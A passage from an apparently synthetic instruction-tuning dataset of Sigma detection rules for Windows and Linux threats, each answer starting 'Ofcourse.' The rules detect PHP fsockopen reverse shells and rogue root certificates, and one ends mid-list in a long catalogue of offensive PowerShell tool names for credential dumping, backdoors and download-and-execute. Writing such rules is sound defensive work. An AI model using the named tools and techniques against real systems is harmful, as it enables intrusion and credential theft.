    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\'\n        TargetObject|endswith: '\\Blob'\n        Details: 'Binary Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\'\n        TargetObject|endswith: '\\Blob'\n        Details: 'Binary Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "addition of new root, CA or AuthRoot certificates to the Windows registry",
      "answer": "In order to detect the addition of new root, CA or AuthRoot certificates to the Windows registry, you should monitor Windows registry settings specifically within the registry key categories associated with root, CA, or AuthRoot certificates. This involves tracking any SetValue events where TargetObject paths contain specific strings related to the system, policies, or enterprise certificates within the Root, CA, or AuthRoot directories. In more detail, lookout for changes in registry paths such as '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\', '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\', and similar paths for CA and AuthRoot certificates. Additionally, ensure that these registry modifications end with '\\Blob' and involve binary data, as these attributes are indicative of certificate additions. This detection method is crucial for maintaining the integrity and security of the system's trust store, as unauthorized or malicious certificates can compromise secure communications and facilitate further attacks. It's categorized under medium severity due to the potential risk it represents, although it's noted that there may be unknown false positives. Keep an eye on these registry alterations to protect the system against unauthorized certificate injections, which are a part of several attack techniques like spoofing, man-in-the-middle attacks, and more."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of PowerShell via creation of named pipe starting with PSHost.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of PowerShell via creation of named pipe starting with PSHost, you should: Focus on monitoring the creation of named pipes in Windows environments, specifically looking for any instances where the pipe name begins with '\\PSHost'. This detection requires you to have logging for Named Pipe Events enabled in your Sysmon configuration, particularly looking out for Event ID 17 and Event ID 18. It's recommended to use or verify against popular Sysmon configurations available online, such as those by SwiftOnSecurity, Neo23x0, or Olaf Hartong. These configurations need to be in place as they are instrumental in capturing the required event data. Testing the detection can be achieved through the use of specific PowerShell scripts designed to simulate named pipe creation that follows the patterns attackers might use. It's important to note that while this method aims to identify malicious activity related to PowerShell execution, the possibility of encountering unknown false positives exists - meaning that not all detections might represent genuine threats. The focus is on providing informational level insights into potential suspicious activities involving PowerShell and named pipes, aiding in the broader strategy of mitigating tactics that involve the execution and automation based on PowerShell scripts, particularly those initiated by adversaries through named pipes that adhere to a naming convention starting with 'PSHost'.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PSHost'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PSHost'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: informational\n",
      "question": "execution of PowerShell via creation of named pipe starting with PSHost",
      "answer": "In order to detect execution of PowerShell via creation of named pipe starting with PSHost, you should: Focus on monitoring the creation of named pipes in Windows environments, specifically looking for any instances where the pipe name begins with '\\PSHost'. This detection requires you to have logging for Named Pipe Events enabled in your Sysmon configuration, particularly looking out for Event ID 17 and Event ID 18. It's recommended to use or verify against popular Sysmon configurations available online, such as those by SwiftOnSecurity, Neo23x0, or Olaf Hartong. These configurations need to be in place as they are instrumental in capturing the required event data. Testing the detection can be achieved through the use of specific PowerShell scripts designed to simulate named pipe creation that follows the patterns attackers might use. It's important to note that while this method aims to identify malicious activity related to PowerShell execution, the possibility of encountering unknown false positives exists - meaning that not all detections might represent genuine threats. The focus is on providing informational level insights into potential suspicious activities involving PowerShell and named pipes, aiding in the broader strategy of mitigating tactics that involve the execution and automation based on PowerShell scripts, particularly those initiated by adversaries through named pipes that adhere to a naming convention starting with 'PSHost'."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an attacker executing an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver, you should monitor for the creation of processes on Windows systems, specifically looking for instances where the process name ends with '\\rundll32.exe' or the original file name is 'RUNDLL32.EXE'. Additionally, scrutinize the command line arguments for the presence of 'InstallScreenSaver', as this indicates the execution of a command to install a screensaver, potentially disguising malicious activity. It's important to note that while this behavior can be indicative of suspicious activities associated with using rundll32.exe for execution of unexpected or malicious applications, there can be legitimate cases where a new screensaver is being installed. This scenario is classified with a medium level of alert due to the potential for false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium\n",
      "question": "An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver",
      "answer": "In order to detect an attacker executing an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver, you should monitor for the creation of processes on Windows systems, specifically looking for instances where the process name ends with '\\rundll32.exe' or the original file name is 'RUNDLL32.EXE'. Additionally, scrutinize the command line arguments for the presence of 'InstallScreenSaver', as this indicates the execution of a command to install a screensaver, potentially disguising malicious activity. It's important to note that while this behavior can be indicative of suspicious activities associated with using rundll32.exe for execution of unexpected or malicious applications, there can be legitimate cases where a new screensaver is being installed. This scenario is classified with a medium level of alert due to the potential for false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a remote thread from a Powershell process to another process.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a remote thread from a Powershell process to another process, you should focus on monitoring Windows environments, particularly looking at events that indicate the creation of remote threads. Pay special attention to events where the source of the remote thread creation stems from either a Powershell executable (`powershell.exe`) or the newer PowerShell Core executable (`pwsh.exe`). This is critical because legitimate tools like these are often leveraged by attackers for malicious purposes due to their powerful capabilities and widespread availability on Windows systems.\n\nHowever, it's important to apply a specific filter to reduce false positives. Specifically, exclude any events where the parent process creating the thread is `C:\\Windows\\System32\\CompatTelRunner.exe`. This is because `CompatTelRunner.exe` is a legitimate Windows component used in compatibility assessments, which could sometimes perform operations resembling malicious behavior but are indeed benign.\n\nWhile the possibility of unknown false positives exists, given the broad nature of PowerShell\u2019s use in both legitimate and malicious activities, the detection should be considered of medium severity due to the potential for abuse in executing code or scripts that can lead to system compromise, data theft, or other unauthorized activities.\n\nMonitoring for such activities is essential for identifying potential indicators of compromise related to various tactics and techniques, notably those associated with execution and defense evasion. By keeping an eye on these specific event patterns, analysts can more effectively spot signs of malicious PowerShell use, which might indicate a broader attack strategy being employed against the network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_remote_thread\ndetection:\n    selection:\n        SourceImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_main_compattelrunner:\n        SourceParentImage: 'C:\\Windows\\System32\\CompatTelRunner.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: create_remote_thread\ndetection:\n    selection:\n        SourceImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_main_compattelrunner:\n        SourceParentImage: 'C:\\Windows\\System32\\CompatTelRunner.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "creation of a remote thread from a Powershell process to another process",
      "answer": "In order to detect the creation of a remote thread from a Powershell process to another process, you should focus on monitoring Windows environments, particularly looking at events that indicate the creation of remote threads. Pay special attention to events where the source of the remote thread creation stems from either a Powershell executable (`powershell.exe`) or the newer PowerShell Core executable (`pwsh.exe`). This is critical because legitimate tools like these are often leveraged by attackers for malicious purposes due to their powerful capabilities and widespread availability on Windows systems.\n\nHowever, it's important to apply a specific filter to reduce false positives. Specifically, exclude any events where the parent process creating the thread is `C:\\Windows\\System32\\CompatTelRunner.exe`. This is because `CompatTelRunner.exe` is a legitimate Windows component used in compatibility assessments, which could sometimes perform operations resembling malicious behavior but are indeed benign.\n\nWhile the possibility of unknown false positives exists, given the broad nature of PowerShell\u2019s use in both legitimate and malicious activities, the detection should be considered of medium severity due to the potential for abuse in executing code or scripts that can lead to system compromise, data theft, or other unauthorized activities.\n\nMonitoring for such activities is essential for identifying potential indicators of compromise related to various tactics and techniques, notably those associated with execution and defense evasion. By keeping an eye on these specific event patterns, analysts can more effectively spot signs of malicious PowerShell use, which might indicate a broader attack strategy being employed against the network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit, you should: Monitor for the creation of processes on Windows systems that are specifically related to the execution of the Ditsnap tool. This involves looking for any process where the image name ends with '\\ditsnap.exe' or where the command line includes 'ditsnap.exe'. It is important to note that there might be instances where the usage of Ditsnap tool could be legitimate, such as by system administrators for maintenance and troubleshooting purposes, hence the high level of scrutiny required. The primary focus should be on ensuring that any detection of the mentioned criteria is thoroughly investigated to distinguish between potentially malicious activities and authorized use.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high\n",
      "question": "use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
      "answer": "In order to Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit, you should: Monitor for the creation of processes on Windows systems that are specifically related to the execution of the Ditsnap tool. This involves looking for any process where the image name ends with '\\ditsnap.exe' or where the command line includes 'ditsnap.exe'. It is important to note that there might be instances where the usage of Ditsnap tool could be legitimate, such as by system administrators for maintenance and troubleshooting purposes, hence the high level of scrutiny required. The primary focus should be on ensuring that any detection of the mentioned criteria is thoroughly investigated to distinguish between potentially malicious activities and authorized use."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: '/php'\n        CommandLine|contains|all:\n            - ' -r '\n            - 'fsockopen'\n        CommandLine|contains:\n            - 'ash'\n            - 'bash'\n            - 'bsh'\n            - 'csh'\n            - 'ksh'\n            - 'pdksh'\n            - 'sh'\n            - 'tcsh'\n            - 'zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: '/php'\n        CommandLine|contains|all:\n            - ' -r '\n            - 'fsockopen'\n        CommandLine|contains:\n            - 'ash'\n            - 'bash'\n            - 'bsh'\n            - 'csh'\n            - 'ksh'\n            - 'pdksh'\n            - 'sh'\n            - 'tcsh'\n            - 'zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n",
      "answer": "In order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Golden Chickens deployment method as used by Evilnum and described in ESET July 2020 report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Golden Chickens deployment method as used by Evilnum and described in ESET July 2020 report, you should: monitor the creation of Windows processes where the command line execution involves the use of 'regsvr32' accompanied by the flags '/s' and '/i', and specifically targets files located in the '\\AppData\\Roaming\\' directory with a '.ocx' extension. This pattern is indicative of an attempt to stealthily register an OCX component often used for malicious purposes, aligning with tactics typically utilized by the actors behind Golden Chickens. Due to the critical nature of this detection, it's important to carefully investigate any such occurrences, although be mindful of the potential for rare but legitimate false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'regsvr32'\n            - '/s'\n            - '/i'\n            - '\\AppData\\Roaming\\'\n            - '.ocx'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'regsvr32'\n            - '/s'\n            - '/i'\n            - '\\AppData\\Roaming\\'\n            - '.ocx'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "Golden Chickens deployment method as used by Evilnum and described in ESET July 2020 report",
      "answer": "In order to detect Golden Chickens deployment method as used by Evilnum and described in ESET July 2020 report, you should: monitor the creation of Windows processes where the command line execution involves the use of 'regsvr32' accompanied by the flags '/s' and '/i', and specifically targets files located in the '\\AppData\\Roaming\\' directory with a '.ocx' extension. This pattern is indicative of an attempt to stealthily register an OCX component often used for malicious purposes, aligning with tactics typically utilized by the actors behind Golden Chickens. Due to the critical nature of this detection, it's important to carefully investigate any such occurrences, although be mindful of the potential for rare but legitimate false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of known offensive powershell scripts used for exploitation or reconnaissance.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of known offensive PowerShell scripts used for exploitation or reconnaissance, you should monitor PowerShell module logs on Windows systems. Specifically, look for evidence of script execution that matches a comprehensive list of known malicious scripts. These scripts span a variety of tactics and techniques, suggesting the potential involvement of several MITRE ATT&CK tactics such as Credential Access, Execution, Defense Evasion, Persistence, Privilege Escalation, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact.\n\nDetection should focus on script names within the PowerShell module logs, including, but not limited to:\n\n- Scripts for adding backdoors, exfiltration, persistence mechanisms, and registry modifications (`Add-ConstrainedDelegationBackdoor.ps1`, `Add-Exfiltration.ps1`, `Add-Persistence.ps1`, etc.).\n- Tools for system reconnaissance, like checking for VM presence, extracting passwords, and more (`Check-VM.ps1`, `Get-PassHashes.ps1`, `Find-AVSignature.ps1`, etc.).\n- Means for bypassing security measures, executing remote commands, and performing lateral movement (`Invoke-BypassUAC.ps1`, `Invoke-CredentialInjection.ps1`, `Execute-Command-MSSQL.ps1`, etc.).\n- Scripts that aid in collecting sensitive data, such as keystrokes and screenshot capturing (`Get-Keystrokes.ps1`, `Get-Screenshot.ps1`, etc.).\n- Utility and exploitation scripts, including those for performing network scans, credential dumping, and injecting malicious payloads (`Port-Scan.ps1`, `Invoke-Mimikatz.ps1`, `Invoke-ReflectivePEInjection.ps1`, etc.).\n\nAdditionally, scripts containing 'Invoke-Sharp' followed by '.ps1', representing a variety of potentially malicious activities performed through custom PowerShell code, should raise alerts.\n\nThese monitoring efforts are crucial for identifying potential hostile activities early on, enabling timely response actions. Due to the nature of these scripts and techniques, encounters will likely represent high-severity incidents that necessitate further investigation, though it's acknowledged that there may be scenarios in which their presence or execution does not indicate a clear threat (marked as unknown false positives).\n\nSuch vigilance is critical for maintaining the integrity, confidentiality, and availability of IT environments against adversaries seeking to exploit PowerShell as a vector for attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_generic:\n        ContextInfo|contains:\n            - 'Add-ConstrainedDelegationBackdoor.ps1'\n            - 'Add-Exfiltration.ps1'\n            - 'Add-Persistence.ps1'\n            - 'Add-RegBackdoor.ps1'\n            - 'Add-RemoteRegBackdoor.ps1'\n            - 'Add-ScrnSaveBackdoor.ps1'\n            - 'Check-VM.ps1'\n            - 'ConvertTo-ROT13.ps1'\n            - 'Copy-VSS.ps1'\n            - 'Create-MultipleSessions.ps1'\n            - 'DNS_TXT_Pwnage.ps1'\n            - 'Do-Exfiltration.ps1'\n            - 'DomainPasswordSpray.ps1'\n            - 'Download_Execute.ps1'\n            - 'Download-Execute-PS.ps1'\n            - 'Enabled-DuplicateToken.ps1'\n            - 'Enable-DuplicateToken.ps1'\n            - 'Execute-Command-MSSQL.ps1'\n            - 'Execute-DNSTXT-Code.ps1'\n            - 'Execute-OnTime.ps1'\n            - 'ExetoText.ps1'\n            - 'Exploit-Jboss.ps1'\n            - 'Find-AVSignature.ps1'\n            - 'Find-Fruit.ps1'\n            - 'Find-GPOLocation.ps1'\n            - 'Find-TrustedDocuments.ps1'\n            - 'FireBuster.ps1'\n            - 'FireListener.ps1'\n            - 'Get-ApplicationHost.ps1'\n            - 'Get-ChromeDump.ps1'\n            - 'Get-ClipboardContents.ps1'\n            - 'Get-ComputerDetail.ps1'\n            - 'Get-FoxDump.ps1'\n            - 'Get-GPPAutologon.ps1'\n            - 'Get-GPPPassword.ps1'\n            - 'Get-IndexedItem.ps1'\n            - 'Get-Keystrokes.ps1'\n            - 'Get-LSASecret.ps1'\n            - 'Get-MicrophoneAudio.ps1'\n            - 'Get-PassHashes.ps1'\n            - 'Get-PassHints.ps1'\n            - 'Get-RegAlwaysInstallElevated.ps1'\n            - 'Get-RegAutoLogon.ps1'\n            - 'Get-RickAstley.ps1'\n            - 'Get-Screenshot.ps1'\n            - 'Get-SecurityPackages.ps1'\n            - 'Get-ServiceFilePermission.ps1'\n            - 'Get-ServicePermission.ps1'\n            - 'Get-ServiceUnquoted.ps1'\n            - 'Get-SiteListPassword.ps1'\n            - 'Get-System.ps1'\n            - 'Get-TimedScreenshot.ps1'\n            - 'Get-UnattendedInstallFile.ps1'\n            - 'Get-Unconstrained.ps1'\n            - 'Get-USBKeystrokes.ps1'\n            - 'Get-VaultCredential.ps1'\n            - 'Get-VulnAutoRun.ps1'\n            - 'Get-VulnSchTask.ps1'\n            - 'Get-WebConfig.ps1'\n            - 'Get-WebCredentials.ps1'\n            - 'Get-WLAN-Keys.ps1'\n            - 'Gupt-Backdoor.ps1'\n            - 'HTTP-Backdoor.ps1'\n            - 'HTTP-Login.ps1'\n            - 'Install-ServiceBinary.ps1'\n            - 'Install-SSP.ps1'\n            - 'Invoke-ACLScanner.ps1'\n            - 'Invoke-ADSBackdoor.ps1'\n            - 'Invoke-AmsiBypass.ps1'\n            - 'Invoke-ARPScan.ps1'\n            - 'Invoke-BackdoorLNK.ps1'\n            - 'Invoke-BadPotato.ps1'\n            - 'Invoke-BetterSafetyKatz.ps1'\n            - 'Invoke-BruteForce.ps1'\n            - 'Invoke-BypassUAC.ps1'\n            - 'Invoke-Carbuncle.ps1'\n            - 'Invoke-Certify.ps1'\n            - 'Invoke-ConPtyShell.ps1'\n            - 'Invoke-CredentialInjection.ps1'\n            - 'Invoke-CredentialsPhish.ps1'\n            - 'Invoke-DAFT.ps1'\n            - 'Invoke-DCSync.ps1'\n            - 'Invoke-Decode.ps1'\n            - 'Invoke-DinvokeKatz.ps1'\n            - 'Invoke-DllInjection.ps1'\n            - 'Invoke-DowngradeAccount.ps1'\n            - 'Invoke-EgressCheck.ps1'\n            - 'Invoke-Encode.ps1'\n            - 'Invoke-EventViewer.ps1'\n            - 'Invoke-Eyewitness.ps1'\n            - 'Invoke-FakeLogonScreen.ps1'\n            - 'Invoke-Farmer.ps1'\n            - 'Invoke-Get-RBCD-Threaded.ps1'\n            - 'Invoke-Gopher.ps1'\n            - 'Invoke-Grouper2.ps1'\n            - 'Invoke-Grouper3.ps1'\n            - 'Invoke-HandleKatz.ps1'\n            - 'Invoke-Interceptor.ps1'\n            - 'Invoke-Internalmonologue.ps1'\n            - 'Invoke-Inveigh.ps1'\n            - 'Invoke-InveighRelay.ps1'\n            - 'Invoke-JSRatRegsvr.ps1'\n            - 'Invoke-JSRatRundll.ps1'\n            - 'Invoke-KrbRelay.ps1'\n            - 'Invoke-KrbRelayUp.ps1'\n            - 'Invoke-LdapSignCheck.ps1'\n            - 'Invoke-Lockless.ps1'\n            - 'Invoke-MalSCCM.ps1'\n            - 'Invoke-Mimikatz.ps1'\n            - 'Invoke-MimikatzWDigestDowngrade.ps1'\n            - 'Invoke-Mimikittenz.ps1'\n            - 'Invoke-MITM6.ps1'\n            - 'Invoke-NanoDump.ps1'\n            - 'Invoke-NetRipper.ps1'\n            - 'Invoke-NetworkRelay.ps1'\n            - 'Invoke-NinjaCopy.ps1'\n            - 'Invoke-OxidResolver.ps1'\n            - 'Invoke-P0wnedshell.ps1'\n            - 'Invoke-P0wnedshellx86.ps1'\n            - 'Invoke-Paranoia.ps1'\n            - 'Invoke-PortScan.ps1'\n            - 'Invoke-PoshRatHttp.ps1'\n            - 'Invoke-PoshRatHttps.ps1'\n            - 'Invoke-PostExfil.ps1'\n            - 'Invoke-PowerDump.ps1'\n            - 'Invoke-PowerShellIcmp.ps1'\n            - 'Invoke-PowerShellTCP.ps1'\n            - 'Invoke-PowerShellTcpOneLine.ps1'\n            - 'Invoke-PowerShellTcpOneLineBind.ps1'\n            - 'Invoke-PowerShellUdp.ps1'\n            - 'Invoke-PowerShellUdpOneLine.ps1'\n            - 'Invoke-PowerShellWMI.ps1'\n            - 'Invoke-PowerThIEf.ps1'\n            - 'Invoke-PPLDump.ps1'\n            - 'Invoke-Prasadhak.ps1'\n            - 'Invoke-PsExec.ps1'\n            - 'Invoke-PsGcat.ps1'\n            - 'Invoke-PsGcatAgent.ps1'\n            - 'Invoke-PSInject.ps1'\n            - 'Invoke-PsUaCme.ps1'\n            - 'Invoke-ReflectivePEInjection.ps1'\n            - 'Invoke-ReverseDNSLookup.ps1'\n            - 'Invoke-Rubeus.ps1'\n            - 'Invoke-RunAs.ps1'\n            - 'Invoke-SafetyKatz.ps1'\n            - 'Invoke-SauronEye.ps1'\n            - 'Invoke-SCShell.ps1'\n            - 'Invoke-Seatbelt.ps1'\n            - 'Invoke-ServiceAbuse.ps1'\n            - 'Invoke-SessionGopher.ps1'\n            - 'Invoke-ShellCode.ps1'\n            - 'Invoke-SMBScanner.ps1'\n            - 'Invoke-Snaffler.ps1'\n            - 'Invoke-Spoolsample.ps1'\n            - 'Invoke-SSHCommand.ps1'\n            - 'Invoke-SSIDExfil.ps1'\n            - 'Invoke-StandIn.ps1'\n            - 'Invoke-StickyNotesExtract.ps1'\n            - 'Invoke-Tater.ps1'\n            - 'Invoke-Thunderfox.ps1'\n            - 'Invoke-ThunderStruck.ps1'\n            - 'Invoke-TokenManipulation.ps1'\n            - 'Invoke-Tokenvator.ps1'\n            - 'Invoke-TotalExec.ps1'\n            - 'Invoke-UrbanBishop.ps1'\n            - 'Invoke-UserHunter.ps1'\n            - 'Invoke-VoiceTroll.ps1'\n            - 'Invoke-Whisker.ps1'\n            - 'Invoke-WinEnum.ps1'\n            - 'Invoke-winPEAS.ps1'\n            - 'Invoke-WireTap.ps1'\n            - 'Invoke-WmiCommand.ps1'\n            - 'Invoke-WScriptBypassUAC.ps1'\n            - 'Invoke-Zerologon.ps1'\n            - 'Keylogger.ps1'\n            - 'MailRaider.ps1'\n            - 'New-HoneyHash.ps1'\n            - 'OfficeMemScraper.ps1'\n            - 'Offline_Winpwn.ps1'\n            - 'Out-CHM.ps1'\n            - 'Out-DnsTxt.ps1'\n            - 'Out-Excel.ps1'\n            - 'Out-HTA.ps1'\n            - 'Out-Java.ps1'\n            - 'Out-JS.ps1'\n            - 'Out-Minidump.ps1'\n            - 'Out-RundllCommand.ps1'\n            - 'Out-SCF.ps1'\n            - 'Out-SCT.ps1'\n            - 'Out-Shortcut.ps1'\n            - 'Out-WebQuery.ps1'\n            - 'Out-Word.ps1'\n            - 'Parse_Keys.ps1'\n            - 'Port-Scan.ps1'\n            - 'PowerBreach.ps1'\n            - 'powercat.ps1'\n            - 'PowerRunAsSystem.psm1'\n            - 